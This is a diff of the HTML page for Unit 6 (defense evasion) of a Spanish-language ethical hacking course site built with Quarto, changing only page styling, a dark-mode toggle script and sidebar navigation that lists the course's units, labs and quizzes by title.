@@ -6,8 +6,9 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
+<meta name="description" content="Curso de Ethical Hacking 2026">
 
-<title>7&nbsp; 🛡️ Unidad 6: Evasión de Defensas – Ethical Hacking 2026</title>
+<title>🛡️ Unidad 6: Evasión de Defensas – Ethical Hacking 2026</title>
 <style>
 /* Default styles provided by pandoc.
 ** See https://pandoc.org/MANUAL.html#variables-for-html for config info.
@@ -70,16 +71,21 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <meta name="quarto:offset" content="../">
 <link href="../contenido/unidad7.html" rel="next">
 <link href="../contenido/unidad5.html" rel="prev">
+<link href="../images/hacking.png" rel="icon" type="image/png">
 <script src="../site_libs/quarto-html/quarto.js" type="module"></script>
 <script src="../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
 <script src="../site_libs/quarto-html/popper.min.js"></script>
 <script src="../site_libs/quarto-html/tippy.umd.min.js"></script>
 <script src="../site_libs/quarto-html/anchor.min.js"></script>
 <link href="../site_libs/quarto-html/tippy.css" rel="stylesheet">
-<link href="../site_libs/quarto-html/quarto-syntax-highlighting-dark-68056a18e515a5789c5e26a7aeb7ac61.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<link href="../site_libs/quarto-html/quarto-syntax-highlighting-61780a260fdcf47536a34fde95582725.css" rel="stylesheet" class="quarto-color-scheme" id="quarto-text-highlighting-styles">
+<link href="../site_libs/quarto-html/quarto-syntax-highlighting-dark-68056a18e515a5789c5e26a7aeb7ac61.css" rel="stylesheet" class="quarto-color-scheme quarto-color-alternate" id="quarto-text-highlighting-styles">
+<link href="../site_libs/quarto-html/quarto-syntax-highlighting-61780a260fdcf47536a34fde95582725.css" rel="stylesheet" class="quarto-color-scheme-extra" id="quarto-text-highlighting-styles">
 <script src="../site_libs/bootstrap/bootstrap.min.js"></script>
 <link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="../site_libs/bootstrap/bootstrap-9265db7866925a9d8c3a929a182b61d8.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
+<link href="../site_libs/bootstrap/bootstrap-87aed0b8589e23e45aa8556edf37a91b.min.css" rel="stylesheet" append-hash="true" class="quarto-color-scheme" id="quarto-bootstrap" data-mode="light">
+<link href="../site_libs/bootstrap/bootstrap-dark-d475e4ab3b4fd243dd6ecd26d4f0399c.min.css" rel="stylesheet" append-hash="true" class="quarto-color-scheme quarto-color-alternate" id="quarto-bootstrap" data-mode="dark">
+<link href="../site_libs/bootstrap/bootstrap-87aed0b8589e23e45aa8556edf37a91b.min.css" rel="stylesheet" append-hash="true" class="quarto-color-scheme-extra" id="quarto-bootstrap" data-mode="light">
 <script id="quarto-search-options" type="application/json">{
   "location": "sidebar",
   "copy-button": false,
@@ -109,9 +115,171 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 }</script>
 
 
+<link rel="stylesheet" href="../css/styles.css">
+<link rel="stylesheet" href="../custom.css">
 </head>
 
-<body class="nav-sidebar floating quarto-light">
+<body class="nav-sidebar floating quarto-dark"><script id="quarto-html-before-body" type="application/javascript">
+    const toggleBodyColorMode = (bsSheetEl) => {
+      const mode = bsSheetEl.getAttribute("data-mode");
+      const bodyEl = window.document.querySelector("body");
+      if (mode === "dark") {
+        bodyEl.classList.add("quarto-dark");
+        bodyEl.classList.remove("quarto-light");
+      } else {
+        bodyEl.classList.add("quarto-light");
+        bodyEl.classList.remove("quarto-dark");
+      }
+    }
+    const toggleBodyColorPrimary = () => {
+      const bsSheetEl = window.document.querySelector("link#quarto-bootstrap:not([rel=disabled-stylesheet])");
+      if (bsSheetEl) {
+        toggleBodyColorMode(bsSheetEl);
+      }
+    }
+    const setColorSchemeToggle = (alternate) => {
+      const toggles = window.document.querySelectorAll('.quarto-color-scheme-toggle');
+      for (let i=0; i < toggles.length; i++) {
+        const toggle = toggles[i];
+        if (toggle) {
+          if (alternate) {
+            toggle.classList.add("alternate");
+          } else {
+            toggle.classList.remove("alternate");
+          }
+        }
+      }
+    };
+    const toggleColorMode = (alternate) => {
+      // Switch the stylesheets
+      const primaryStylesheets = window.document.querySelectorAll('link.quarto-color-scheme:not(.quarto-color-alternate)');
+      const alternateStylesheets = window.document.querySelectorAll('link.quarto-color-scheme.quarto-color-alternate');
+      manageTransitions('#quarto-margin-sidebar .nav-link', false);
+      if (alternate) {
+        // note: dark is layered on light, we don't disable primary!
+        enableStylesheet(alternateStylesheets);
+        for (const sheetNode of alternateStylesheets) {
+          if (sheetNode.id === "quarto-bootstrap") {
+            toggleBodyColorMode(sheetNode);
+          }
+        }
+      } else {
+        disableStylesheet(alternateStylesheets);
+        enableStylesheet(primaryStylesheets)
+        toggleBodyColorPrimary();
+      }
+      manageTransitions('#quarto-margin-sidebar .nav-link', true);
+      // Switch the toggles
+      setColorSchemeToggle(alternate)
+      // Hack to workaround the fact that safari doesn't
+      // properly recolor the scrollbar when toggling (#1455)
+      if (navigator.userAgent.indexOf('Safari') > 0 && navigator.userAgent.indexOf('Chrome') == -1) {
+        manageTransitions("body", false);
+        window.scrollTo(0, 1);
+        setTimeout(() => {
+          window.scrollTo(0, 0);
+          manageTransitions("body", true);
+        }, 40);
+      }
+    }
+    const disableStylesheet = (stylesheets) => {
+      for (let i=0; i < stylesheets.length; i++) {
+        const stylesheet = stylesheets[i];
+        stylesheet.rel = 'disabled-stylesheet';
+      }
+    }
+    const enableStylesheet = (stylesheets) => {
+      for (let i=0; i < stylesheets.length; i++) {
+        const stylesheet = stylesheets[i];
+        if(stylesheet.rel !== 'stylesheet') { // for Chrome, which will still FOUC without this check
+          stylesheet.rel = 'stylesheet';
+        }
+      }
+    }
+    const manageTransitions = (selector, allowTransitions) => {
+      const els = window.document.querySelectorAll(selector);
+      for (let i=0; i < els.length; i++) {
+        const el = els[i];
+        if (allowTransitions) {
+          el.classList.remove('notransition');
+        } else {
+          el.classList.add('notransition');
+        }
+      }
+    }
+    const isFileUrl = () => {
+      return window.location.protocol === 'file:';
+    }
+    const hasAlternateSentinel = () => {
+      let styleSentinel = getColorSchemeSentinel();
+      if (styleSentinel !== null) {
+        return styleSentinel === "alternate";
+      } else {
+        return false;
+      }
+    }
+    const setStyleSentinel = (alternate) => {
+      const value = alternate ? "alternate" : "default";
+      if (!isFileUrl()) {
+        window.localStorage.setItem("quarto-color-scheme", value);
+      } else {
+        localAlternateSentinel = value;
+      }
+    }
+    const getColorSchemeSentinel = () => {
+      if (!isFileUrl()) {
+        const storageValue = window.localStorage.getItem("quarto-color-scheme");
+        return storageValue != null ? storageValue : localAlternateSentinel;
+      } else {
+        return localAlternateSentinel;
+      }
+    }
+    const toggleGiscusIfUsed = (isAlternate, darkModeDefault) => {
+      const baseTheme = document.querySelector('#giscus-base-theme')?.value ?? 'light';
+      const alternateTheme = document.querySelector('#giscus-alt-theme')?.value ?? 'dark';
+      let newTheme = '';
+      if(authorPrefersDark) {
+        newTheme = isAlternate ? baseTheme : alternateTheme;
+      } else {
+        newTheme = isAlternate ? alternateTheme : baseTheme;
+      }
+      const changeGiscusTheme = () => {
+        // From: https://github.com/giscus/giscus/issues/336
+        const sendMessage = (message) => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+        }
+        sendMessage({
+          setConfig: {
+            theme: newTheme
+          }
+        });
+      }
+      const isGiscussLoaded = window.document.querySelector('iframe.giscus-frame') !== null;
+      if (isGiscussLoaded) {
+        changeGiscusTheme();
+      }
+    };
+    const authorPrefersDark = true;
+    const darkModeDefault = authorPrefersDark;
+    let localAlternateSentinel = darkModeDefault ? 'alternate' : 'default';
+    // Dark / light mode switch
+    window.quartoToggleColorScheme = () => {
+      // Read the current dark / light value
+      let toAlternate = !hasAlternateSentinel();
+      toggleColorMode(toAlternate);
+      setStyleSentinel(toAlternate);
+      toggleGiscusIfUsed(toAlternate, darkModeDefault);
+      window.dispatchEvent(new Event('resize'));
+    };
+    // Switch to dark mode if need be
+    if (hasAlternateSentinel()) {
+      toggleColorMode(true);
+    } else {
+      toggleColorMode(false);
+    }
+  </script>
 
 <div id="quarto-search-results"></div>
   <header id="quarto-header" class="headroom fixed-top">
@@ -120,7 +288,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
       <button type="button" class="quarto-btn-toggle btn" data-bs-toggle="collapse" role="button" data-bs-target=".quarto-sidebar-collapse-item" aria-controls="quarto-sidebar" aria-expanded="false" aria-label="Toggle sidebar navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
         <i class="bi bi-layout-text-sidebar-reverse"></i>
       </button>
-        <nav class="quarto-page-breadcrumbs" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../contenido/unidad1.html">Contenido</a></li><li class="breadcrumb-item"><a href="../contenido/unidad6.html"><span class="chapter-number">7</span>&nbsp; <span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></a></li></ol></nav>
+        <nav class="quarto-page-breadcrumbs" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../contenido/unidad1.html">Contenido</a></li><li class="breadcrumb-item"><a href="../contenido/unidad6.html"><span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></a></li></ol></nav>
         <a class="flex-grow-1" role="navigation" data-bs-toggle="collapse" data-bs-target=".quarto-sidebar-collapse-item" aria-controls="quarto-sidebar" aria-expanded="false" aria-label="Toggle sidebar navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">      
         </a>
       <button type="button" class="btn quarto-search-button" aria-label="Search" onclick="window.quartoOpenSearch();">
@@ -133,9 +301,50 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article">
 <!-- sidebar -->
   <nav id="quarto-sidebar" class="sidebar collapse collapse-horizontal quarto-sidebar-collapse-item sidebar-navigation floating overflow-auto">
-    <div class="pt-lg-2 mt-2 text-left sidebar-header">
+    <div class="pt-lg-2 mt-2 text-left sidebar-header sidebar-header-stacked">
+      <a href="../index.html" class="sidebar-logo-link">
+      <img src="../images/hacking.png" alt="" class="sidebar-logo light-content py-0 d-lg-inline d-none">
+      <img src="../images/hacking.png" alt="" class="sidebar-logo dark-content py-0 d-lg-inline d-none">
+      </a>
     <div class="sidebar-title mb-0 py-0">
       <a href="../">Ethical Hacking 2026</a> 
+        <div class="sidebar-tools-main tools-wide">
+    <div class="dropdown">
+      <a href="" title="Download" id="quarto-navigation-tool-dropdown-0" class="quarto-navigation-tool dropdown-toggle px-1" data-bs-toggle="dropdown" aria-expanded="false" role="link" aria-label="Download"><i class="bi bi-download"></i></a>
+      <ul class="dropdown-menu" aria-labelledby="quarto-navigation-tool-dropdown-0">
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="../ethical_hacking_2026.pdf">
+              <i class="bi bi-file-pdf pe-1"></i>
+            Download PDF
+            </a>
+          </li>
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="../ethical_hacking_2026.epub">
+              <i class="bi bi-journal pe-1"></i>
+            Download ePub
+            </a>
+          </li>
+      </ul>
+    </div>
+    <div class="dropdown">
+      <a href="" title="Share" id="quarto-navigation-tool-dropdown-1" class="quarto-navigation-tool dropdown-toggle px-1" data-bs-toggle="dropdown" aria-expanded="false" role="link" aria-label="Share"><i class="bi bi-share"></i></a>
+      <ul class="dropdown-menu" aria-labelledby="quarto-navigation-tool-dropdown-1">
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="https://twitter.com/intent/tweet?url=|url|">
+              <i class="bi bi-twitter pe-1"></i>
+            Twitter
+            </a>
+          </li>
+          <li>
+            <a class="dropdown-item sidebar-tools-main-item" href="https://www.linkedin.com/sharing/share-offsite/?url=|url|">
+              <i class="bi bi-linkedin pe-1"></i>
+            LinkedIn
+            </a>
+          </li>
+      </ul>
+    </div>
+  <a href="" class="quarto-color-scheme-toggle quarto-navigation-tool  px-1" onclick="window.quartoToggleColorScheme(); return false;" title="Toggle dark mode"><i class="bi"></i></a>
+</div>
     </div>
       </div>
         <div class="mt-2 flex-shrink-0 align-items-center">
@@ -147,8 +356,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
     <ul class="list-unstyled mt-1">
         <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../index.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">1</span>&nbsp; <span class="chapter-title">Ethical Hacking 2026 - ABACOM</span></span></a>
+  <a href="../index.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Ethical Hacking 2026 - ABACOM</span></a>
   </div>
 </li>
         <li class="sidebar-item sidebar-item-section">
@@ -162,207 +370,189 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
       <ul id="quarto-sidebar-section-1" class="collapse list-unstyled sidebar-section depth1 show">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad1.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">2</span>&nbsp; <span class="chapter-title">Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span></a>
+  <a href="../contenido/unidad1.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Unidad 1: Fundamentos y Reconocimiento Agéntico</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad2.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">3</span>&nbsp; <span class="chapter-title">🤖 Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></span></a>
+  <a href="../contenido/unidad2.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🤖 Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad3.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">4</span>&nbsp; <span class="chapter-title">Unidad 3: Explotación Web y APIs 2026 🕷️</span></span></a>
+  <a href="../contenido/unidad3.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Unidad 3: Explotación Web y APIs 2026 🕷️</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad4.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">5</span>&nbsp; <span class="chapter-title">🔐 Unidad 4: Hacking de Identidad y AD Moderno</span></span></a>
+  <a href="../contenido/unidad4.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🔐 Unidad 4: Hacking de Identidad y AD Moderno</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad5.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">6</span>&nbsp; <span class="chapter-title">🚀 Unidad 5: Pentesting Autónomo y Red Teaming Agéntico</span></span></a>
+  <a href="../contenido/unidad5.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🚀 Unidad 5: Pentesting Autónomo y Red Teaming Agéntico</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad6.html" class="sidebar-item-text sidebar-link active">
- <span class="menu-text"><span class="chapter-number">7</span>&nbsp; <span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></span></a>
+  <a href="../contenido/unidad6.html" class="sidebar-item-text sidebar-link active"><span class="chapter-title">🛡️ Unidad 6: Evasión de Defensas</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad7.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">8</span>&nbsp; <span class="chapter-title">🏭 Unidad 7: Ciberseguridad Industrial</span></span></a>
+  <a href="../contenido/unidad7.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🏭 Unidad 7: Ciberseguridad Industrial</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../contenido/unidad8.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">9</span>&nbsp; <span class="chapter-title">🎯 Unidad 8: Post-Explotación, Reporte y Ética</span></span></a>
+  <a href="../contenido/unidad8.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">🎯 Unidad 8: Post-Explotación, Reporte y Ética</span></a>
   </div>
 </li>
       </ul>
   </li>
         <li class="sidebar-item sidebar-item-section">
       <div class="sidebar-item-container"> 
-            <a class="sidebar-item-text sidebar-link text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-2" role="navigation" aria-expanded="true">
+            <a class="sidebar-item-text sidebar-link text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-2" role="navigation" aria-expanded="false">
  <span class="menu-text">Laboratorios</span></a>
-          <a class="sidebar-item-toggle text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-2" role="navigation" aria-expanded="true" aria-label="Toggle section">
+          <a class="sidebar-item-toggle text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-2" role="navigation" aria-expanded="false" aria-label="Toggle section">
             <i class="bi bi-chevron-right ms-2"></i>
           </a> 
       </div>
-      <ul id="quarto-sidebar-section-2" class="collapse list-unstyled sidebar-section depth1 show">  
+      <ul id="quarto-sidebar-section-2" class="collapse list-unstyled sidebar-section depth1 ">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad1.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">10</span>&nbsp; <span class="chapter-title">Lab 1: Reconocimiento y Enumeración</span></span></a>
+  <a href="../labs/lab-unidad1.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 1: Reconocimiento y Enumeración</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad2.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">11</span>&nbsp; <span class="chapter-title">Lab 2: Prompt Injection y Jailbreaking en LLMs</span></span></a>
+  <a href="../labs/lab-unidad2.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 2: Prompt Injection y Jailbreaking en LLMs</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad3.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">12</span>&nbsp; <span class="chapter-title">Lab 3: Auditoría Web con OWASP WebGoat</span></span></a>
+  <a href="../labs/lab-unidad3.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 3: Auditoría Web con OWASP WebGoat</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad4.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">13</span>&nbsp; <span class="chapter-title">Lab 4: Active Directory - Kerberoasting y Pass-the-Hash</span></span></a>
+  <a href="../labs/lab-unidad4.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 4: Active Directory - Kerberoasting y Pass-the-Hash</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad5.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">14</span>&nbsp; <span class="chapter-title">Lab 5: Pentesting Autónomo con AutoRecon y Metasploit</span></span></a>
+  <a href="../labs/lab-unidad5.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 5: Pentesting Autónomo con AutoRecon y Metasploit</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad6.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">15</span>&nbsp; <span class="chapter-title">Lab 6: Desarrollo de Payload Indetectable</span></span></a>
+  <a href="../labs/lab-unidad6.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 6: Desarrollo de Payload Indetectable</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad7.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">16</span>&nbsp; <span class="chapter-title">Lab 7: Hardening y Pentesting de Sistemas OT</span></span></a>
+  <a href="../labs/lab-unidad7.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 7: Hardening y Pentesting de Sistemas OT</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../labs/lab-unidad8.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></span></a>
+  <a href="../labs/lab-unidad8.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></a>
   </div>
 </li>
       </ul>
   </li>
         <li class="sidebar-item sidebar-item-section">
       <div class="sidebar-item-container"> 
-            <a class="sidebar-item-text sidebar-link text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="true">
+            <a class="sidebar-item-text sidebar-link text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="false">
  <span class="menu-text">Evaluación</span></a>
-          <a class="sidebar-item-toggle text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="true" aria-label="Toggle section">
+          <a class="sidebar-item-toggle text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-3" role="navigation" aria-expanded="false" aria-label="Toggle section">
             <i class="bi bi-chevron-right ms-2"></i>
           </a> 
       </div>
-      <ul id="quarto-sidebar-section-3" class="collapse list-unstyled sidebar-section depth1 show">  
+      <ul id="quarto-sidebar-section-3" class="collapse list-unstyled sidebar-section depth1 ">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad1.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">18</span>&nbsp; <span class="chapter-title">Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span></a>
+  <a href="../quizzes/unidad1.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad2.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">19</span>&nbsp; <span class="chapter-title">Quiz Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></span></a>
+  <a href="../quizzes/unidad2.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 2: Vulnerabilidades en IA y Modelos de Lenguaje</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad3.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">20</span>&nbsp; <span class="chapter-title">Quiz Unidad 3: Explotación Web y APIs</span></span></a>
+  <a href="../quizzes/unidad3.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 3: Explotación Web y APIs</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad4.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">21</span>&nbsp; <span class="chapter-title">Quiz Unidad 4: Hacking de Identidad y AD</span></span></a>
+  <a href="../quizzes/unidad4.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 4: Hacking de Identidad y AD</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad5.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">22</span>&nbsp; <span class="chapter-title">Quiz Unidad 5: Pentesting Autónomo y Red Teaming</span></span></a>
+  <a href="../quizzes/unidad5.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 5: Pentesting Autónomo y Red Teaming</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad6.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">23</span>&nbsp; <span class="chapter-title">Quiz Unidad 6: Evasión de Defensas</span></span></a>
+  <a href="../quizzes/unidad6.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 6: Evasión de Defensas</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad7.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">24</span>&nbsp; <span class="chapter-title">Quiz Unidad 7: Ciberseguridad Industrial (OT/ICS)</span></span></a>
+  <a href="../quizzes/unidad7.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 7: Ciberseguridad Industrial (OT/ICS)</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../quizzes/unidad8.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">25</span>&nbsp; <span class="chapter-title">Quiz Unidad 8: Post-Explotación, Reporte y Ética</span></span></a>
+  <a href="../quizzes/unidad8.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Quiz Unidad 8: Post-Explotación, Reporte y Ética</span></a>
   </div>
 </li>
       </ul>
   </li>
         <li class="sidebar-item sidebar-item-section">
       <div class="sidebar-item-container"> 
-            <a class="sidebar-item-text sidebar-link text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="true">
+            <a class="sidebar-item-text sidebar-link text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="false">
  <span class="menu-text">Anexos</span></a>
-          <a class="sidebar-item-toggle text-start" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="true" aria-label="Toggle section">
+          <a class="sidebar-item-toggle text-start collapsed" data-bs-toggle="collapse" data-bs-target="#quarto-sidebar-section-4" role="navigation" aria-expanded="false" aria-label="Toggle section">
             <i class="bi bi-chevron-right ms-2"></i>
           </a> 
       </div>
-      <ul id="quarto-sidebar-section-4" class="collapse list-unstyled sidebar-section depth1 show">  
+      <ul id="quarto-sidebar-section-4" class="collapse list-unstyled sidebar-section depth1 ">  
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-bash-scripting.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">26</span>&nbsp; <span class="chapter-title">Anexo A: Minicurso de Bash Scripting</span></span></a>
+  <a href="../anexos/anexo-bash-scripting.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Anexo A: Minicurso de Bash Scripting</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-docker.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">27</span>&nbsp; <span class="chapter-title">Anexo B: Minicurso de Docker</span></span></a>
+  <a href="../anexos/anexo-docker.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Anexo B: Minicurso de Docker</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-maquinas-virtuales.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">28</span>&nbsp; <span class="chapter-title">Anexo C: Minicurso de Máquinas Virtuales con Kali Linux</span></span></a>
+  <a href="../anexos/anexo-maquinas-virtuales.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Anexo C: Minicurso de Máquinas Virtuales con Kali Linux</span></a>
   </div>
 </li>
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
-  <a href="../anexos/anexo-opencv-seguro.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">29</span>&nbsp; <span class="chapter-title">Configuración Segura de OpenCV</span></span></a>
+  <a href="../anexos/anexo-opencv-seguro.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Configuración Segura de OpenCV</span></a>
   </div>
 </li>
       </ul>
   </li>
+        <li class="sidebar-item">
+  <div class="sidebar-item-container"> 
+  <a href="../about.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Acerca del Curso</span></a>
+  </div>
+</li>
+        <li class="sidebar-item">
+  <div class="sidebar-item-container"> 
+  <a href="../license.html" class="sidebar-item-text sidebar-link"><span class="chapter-title">Licencia</span></a>
+  </div>
+</li>
     </ul>
     </div>
 </nav>
@@ -373,20 +563,20 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
     <h2 id="toc-title">Table of contents</h2>
    
   <ul>
-  <li><a href="#unidad-6-evasión-de-defensas" id="toc-unidad-6-evasión-de-defensas" class="nav-link active" data-scroll-target="#unidad-6-evasión-de-defensas"><span class="header-section-number">8</span> 🛡️ Unidad 6: Evasión de Defensas</a>
